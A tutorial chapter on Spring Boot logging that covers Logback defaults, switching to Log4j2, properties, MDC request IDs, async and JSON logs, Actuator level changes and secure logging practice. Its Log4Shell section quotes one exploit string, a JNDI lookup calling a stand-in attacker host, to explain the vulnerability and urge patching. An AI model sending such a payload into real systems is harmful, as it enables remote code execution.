---
title: Logging in Spring Boot & Production
subtitle: Spring Boot's default Logback setup, switching to Log4j2 correctly, logging properties and per-package levels, profiles, MDC request IDs, async and structured JSON logs, changing levels at runtime with Actuator, Log4Shell, and production best practices.
order: 3
---

## Introduction

Spring Boot configures logging for you out of the box. This chapter covers what it does by default, how to switch to Log4j2, how to control logging with properties, and the techniques production systems rely on: request IDs with MDC, asynchronous and JSON logging, runtime level changes, and keeping logging secure.

## The Default: SLF4J + Logback

Every Spring Boot starter pulls in **`spring-boot-starter-logging`**, which provides **SLF4J + Logback**, plus bridges so libraries that use JUL or Log4j APIs are routed to the same place. With no configuration at all you get:

- console output at **INFO** level;
- a colour-coded pattern with timestamp, level, process ID, thread and logger name.

```output Default console line
2026-07-23T10:15:30.123+05:30  INFO 12345 --- [demo] [           main] c.e.demo.EmployeeService                 : Employee Saved
```

## Switching to Log4j2

Exclude the default logging starter and add the Log4j2 starter:

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <exclusions>
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
        </exclusion>
    </exclusions>
</dependency>

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-log4j2</artifactId>
</dependency>
```

> [!WARNING]
> `spring-boot-starter-logging` arrives through **every** starter (`-web`, `-data-jpa`, `-security`…). If any of them still brings Logback, you'll get *"Class path contains multiple SLF4J providers"* or *"LoggerFactory is not a Logback LoggerContext"* errors. Exclude it from each starter, or globally (in Gradle: `configurations.all { exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging' }`). Check with `mvn dependency:tree`.

Then add `src/main/resources/log4j2-spring.xml` (see *Log4j2 Architecture & Configuration*). Your Java code doesn't change — it still uses SLF4J.

## Configuring Logging with Properties

For most applications, `application.properties` is enough — no XML needed:

```properties
# Levels — root and per package
logging.level.root=INFO
logging.level.com.example=DEBUG
logging.level.org.springframework.web=INFO
logging.level.org.hibernate.SQL=DEBUG

# Write to a file (in addition to the console)
logging.file.name=logs/application.log

# Patterns
logging.pattern.console=%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n

# Rolling and retention (Logback)
logging.logback.rollingpolicy.max-file-size=100MB
logging.logback.rollingpolicy.max-history=30
logging.logback.rollingpolicy.total-size-cap=5GB
```

Levels can also be set with environment variables, which is handy in containers: `LOGGING_LEVEL_COM_EXAMPLE=DEBUG`.

> [!NOTE]
> The `logging.logback.rollingpolicy.*` properties apply to Logback only. With Log4j2, configure rolling and retention in `log4j2-spring.xml`.

### Profile-Specific Logging

```properties
# application-dev.properties
logging.level.com.example=DEBUG

# application-prod.properties
logging.level.com.example=INFO
```

In `log4j2-spring.xml` (or `logback-spring.xml`) you can do the same with profile blocks:

```xml
<SpringProfile name="prod">
    <Root level="INFO">
        <AppenderRef ref="Rolling"/>
    </Root>
</SpringProfile>
```

## Changing Levels at Runtime with Actuator

With Spring Boot Actuator and the `loggers` endpoint exposed, you can switch a package to DEBUG on a running server — no restart:

```properties
management.endpoints.web.exposure.include=health,info,loggers
```

```bash
curl -X POST http://localhost:8080/actuator/loggers/com.example.payment \
     -H "Content-Type: application/json" \
     -d '{"configuredLevel":"DEBUG"}'
```

Set it back to `INFO` (or `null` to inherit) when you're done.

> [!WARNING]
> Secure Actuator endpoints. An open `/actuator/loggers` lets anyone change logging, and other endpoints can leak configuration — expose only what you need and protect it with Spring Security.

## MDC — Tracing a Request Across Log Lines

In a busy server, log lines from hundreds of requests interleave. The **Mapped Diagnostic Context (MDC)** attaches values such as a request ID to every log line written by the current thread:

```java
@Component
public class RequestIdFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {
        String requestId = Optional.ofNullable(request.getHeader("X-Request-Id"))
                                   .orElse(UUID.randomUUID().toString());
        MDC.put("requestId", requestId);
        response.setHeader("X-Request-Id", requestId);
        try {
            chain.doFilter(request, response);
        } finally {
            MDC.clear();   // threads are pooled — always clean up
        }
    }
}
```

Add it to the pattern with `%X{requestId}`:

```text
%d{HH:mm:ss.SSS} [%t] %-5level [%X{requestId}] %c{1} - %m%n
```

```output
10:15:30.101 [exec-3] INFO  [9f1c2a7e] OrderController - Placing order
10:15:30.140 [exec-7] INFO  [3b77d0c1] OrderController - Placing order
10:15:30.188 [exec-3] ERROR [9f1c2a7e] PaymentService - Payment failed
```

Now you can find every line of one request — or, passed along in a header, across several microservices. Spring Boot with **Micrometer Tracing** adds `traceId` and `spanId` to the MDC automatically.

> [!NOTE]
> MDC is stored per thread (a `ThreadLocal`), so values don't follow work into `@Async` methods or `CompletableFuture` stages automatically — copy them with a `TaskDecorator` or Micrometer context propagation.

## Asynchronous Logging

Writing to disk on the request thread adds latency. Log4j2's **async loggers** hand log events to a background thread using the lock-free LMAX Disruptor:

```xml
<!-- Mix async and sync loggers in log4j2-spring.xml -->
<Loggers>
    <AsyncLogger name="com.example" level="INFO" additivity="false">
        <AppenderRef ref="Rolling"/>
    </AsyncLogger>
    <Root level="INFO">
        <AppenderRef ref="Console"/>
    </Root>
</Loggers>
```

All-async mode is enabled with the system property `log4j2.contextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector` (and the `com.lmax:disruptor` dependency). With Logback, wrap appenders in an `AsyncAppender`.

| Benefit | Trade-off |
| --- | --- |
| Much lower latency on application threads | Recent events can be lost if the JVM crashes |
| Higher throughput under load | When the queue fills, threads block or events are dropped (configurable) |

## Structured (JSON) Logging

Log aggregation tools (ELK / OpenSearch, Grafana Loki, Datadog, Splunk) search JSON far better than free text. Spring Boot 3.4+ can emit structured logs with a property:

```properties
# formats: ecs, logstash or gelf
logging.structured.format.console=ecs
```

```output
{"@timestamp":"2026-07-23T04:45:30.123Z","log.level":"INFO","process.thread.name":"exec-3","log.logger":"com.example.OrderController","message":"Placing order","requestId":"9f1c2a7e"}
```

Older versions use Log4j2's `JsonTemplateLayout` or the `logstash-logback-encoder`.

## Log4Shell — the Log4j2 Vulnerability Every Developer Should Know

In December 2021, **CVE-2021-44228 ("Log4Shell")** showed that Log4j2 versions **2.0-beta9 to 2.14.1** evaluated JNDI lookups inside logged messages. Logging attacker-controlled text such as a header containing `${jndi:ldap://attacker.example/a}` could make the server download and run remote code. It was one of the most serious vulnerabilities ever found in Java.

- Fixed in **2.15–2.17.1**; use the latest **2.x** (2.17.1 or later at a minimum).
- Spring Boot's default Logback setup wasn't affected, but applications that switched to Log4j2 were.
- The lesson: keep logging libraries patched, check dependency trees for old versions (`mvn dependency:tree`), and treat log input as untrusted.

## Logging Exceptions Properly

```java
// ❌ Stack trace lost
logger.error("Payment failed: " + e.getMessage());

// ❌ Logged here AND again by every caller that catches and rethrows
logger.error("Payment failed", e);
throw e;

// ✅ Log once, with context and the exception, where it's actually handled
logger.error("Payment failed for order {}", orderId, e);
```

A good rule: **log where you handle the exception**, not at every layer it passes through. In Spring, a `@ControllerAdvice` is a natural single place to log unexpected exceptions.

## What to Log — and What Not to Log

| Log | Don't log |
| --- | --- |
| Business events (order placed, payment completed) | Passwords, OTPs, PINs |
| Request IDs and user IDs | JWTs, API keys, session IDs |
| External calls with timings and status | Full card or account numbers (mask them) |
| Warnings and errors with context | Aadhaar, PAN, health data or other personal information |
| Startup configuration (non-secret) | Whole request/response bodies by default |

> [!IMPORTANT]
> Logs are often shipped to third-party tools and kept for months. Anything you log should be treated as visible to everyone who can read those logs — and personal data in logs falls under privacy laws such as India's DPDP Act and the GDPR.

## Interview Questions

### What logging framework does Spring Boot use by default?

SLF4J with Logback, provided by `spring-boot-starter-logging`, which every starter includes.

### How do you switch Spring Boot to Log4j2?

Exclude `spring-boot-starter-logging` from the starters and add `spring-boot-starter-log4j2`, then provide `log4j2-spring.xml`. Application code stays on SLF4J.

### How do you change the log level of one package?

`logging.level.com.example.payment=DEBUG` in `application.properties`, an environment variable, or at runtime through Actuator's `/actuator/loggers` endpoint.

### What is MDC?

The Mapped Diagnostic Context — per-thread key/value data (such as a request ID or user ID) that the layout adds to every log line, so all lines for one request can be correlated.

### What is asynchronous logging, and what is the risk?

Log events are handed to a background thread instead of being written on the application thread, reducing latency. The risk is losing recent events on a crash, and blocking or dropping events when the queue is full.

### What was Log4Shell?

CVE-2021-44228: Log4j2 2.0-beta9 to 2.14.1 performed JNDI lookups in logged messages, allowing remote code execution through attacker-controlled log input. Fixed by upgrading to 2.17.1 or later.

### Why use structured logging?

JSON logs can be indexed and queried by field (level, logger, request ID) in log-aggregation tools, instead of being parsed with fragile regexes.

## Common Mistakes

- ❌ **Forgetting to exclude Spring Boot's default Logback starter** when switching to Log4j2.
- ❌ **Leaving DEBUG on in production** — huge, costly logs and possible data leaks.
- ❌ **Not clearing the MDC** in pooled threads.
- ❌ **Running an outdated Log4j2** version.
- ❌ **Exposing `/actuator/loggers` publicly.**
- ❌ **Logging the same exception at every layer.**

## Best Practices

- ✅ Code against SLF4J; let Spring Boot configure Logback, or switch cleanly to Log4j2.
- ✅ INFO in production, DEBUG per package only while troubleshooting — preferably toggled via Actuator.
- ✅ Add a request ID (or trace ID) to every line with MDC.
- ✅ Roll files by size and time, with a retention limit — or log to stdout in containers and let the platform collect it.
- ✅ Prefer structured JSON logs when you use a log-aggregation platform.
- ✅ Keep logging libraries up to date, and never log secrets or personal data.

## Key Takeaways

- ✅ Spring Boot defaults to SLF4J + Logback via `spring-boot-starter-logging`.
- ✅ Switch to Log4j2 by excluding that starter everywhere and adding `spring-boot-starter-log4j2`.
- ✅ `logging.level.*`, `logging.file.name` and `logging.pattern.*` cover most needs without XML.
- ✅ MDC request IDs make concurrent logs traceable; clear them in `finally`.
- ✅ Async and JSON logging suit high-volume production systems.
- ✅ Log4Shell is a reminder to patch dependencies and treat logs as sensitive.
